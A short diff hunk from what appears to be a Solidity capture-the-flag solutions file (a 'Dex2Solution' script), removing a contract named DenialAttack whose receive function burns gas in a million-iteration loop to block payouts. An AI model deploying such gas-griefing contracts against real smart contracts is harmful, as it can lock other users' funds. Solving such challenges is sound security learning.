@@ -101,9 +101,3 @@ contract Dex2Solution is Script {
         return amount * fromBalance / toBalance;
     }
 }
-
-contract DenialAttack {
-    receive() external payable {
-        for (uint256 i = 0; i < 1_000_000; i++) {}
-    }
-}
